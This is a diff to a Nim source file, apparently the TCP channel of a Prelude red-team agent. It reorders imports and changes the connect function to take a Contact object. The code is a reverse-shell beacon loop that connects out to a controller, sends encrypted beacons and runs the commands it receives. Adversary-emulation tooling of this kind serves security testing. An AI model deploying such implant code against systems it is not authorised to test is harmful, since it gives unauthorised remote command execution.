@@ -1,23 +1,23 @@
-from contact import Beacon, Instruction, jitterSleep
-from rawhttp import requestPayload
-from ../commands/commands import CommandExecution, runCommand
-from ../util/cryptic import toString, toByteSeq, encrypt, decrypt
-from ../util/config import encryptionKey
-from ../util/encoder import hexToSeqByte, seqByteToHex
-import marshal
-import net
-import os
-from sequtils import concat
-import logging
 import strutils
 import strformat
+import os
+import net
+import marshal
+import logging
+from sequtils import concat
+from rawhttp import requestPayload
+from contact import Contact, Beacon, Instruction, jitterSleep
+from ../util/encoder import hexToSeqByte, seqByteToHex
+from ../util/cryptic import toString, toByteSeq, encrypt, decrypt
+from ../util/config import encryptionKey
+from ../commands/commands import CommandExecution, runCommand
 
 
 var logger = newConsoleLogger()
 
 proc bufferedSend(conn: Socket, beacon: Beacon) =
     ## Sends the agent beacon over a buffered socket.
-    ## 
+    ##
     # Marshall the beacon with Nim's fancy marshall operator.
     var data: string = $$beacon
     let encryptedData: seq[byte] = encrypt(data, encryptionKey)
@@ -45,8 +45,8 @@ proc respond(conn: Socket, beacon: Beacon, message: string) =
     bufferedSend(conn, newBeacon)
 
 proc listen(conn: Socket, beacon: Beacon) =
-    ## TCP reverse shell. 
-    ## 
+    ## TCP reverse shell.
+    ##
     bufferedSend(conn, beacon)
     while true:
         try:
@@ -56,15 +56,13 @@ proc listen(conn: Socket, beacon: Beacon) =
         except:
             break
 
-proc tcpCommunicate*(address: string, sleep: int, beacon: Beacon) =
+proc tcpCommunicate*(contact: Contact, sleep: int, beacon: Beacon) =
     ## Listens for Prelude beacons.
-    ## 
-    var host: string = address.split(":")[0]
-    var port: int = parseInt(address.split(":")[1])
+    ##
     while true:
         let client = newSocket()
-        logger.log(lvlInfo, fmt"Connecting to {host} on port {port}")
-        client.connect(host, Port(port))
+        logger.log(lvlInfo, fmt"Connecting to {contact.address} on port {contact.port}")
+        client.connect(contact.address, Port(contact.port))
         listen(client, beacon)
         # Sleep until the next beacon.
         jitterSleep(sleep, "TCP")
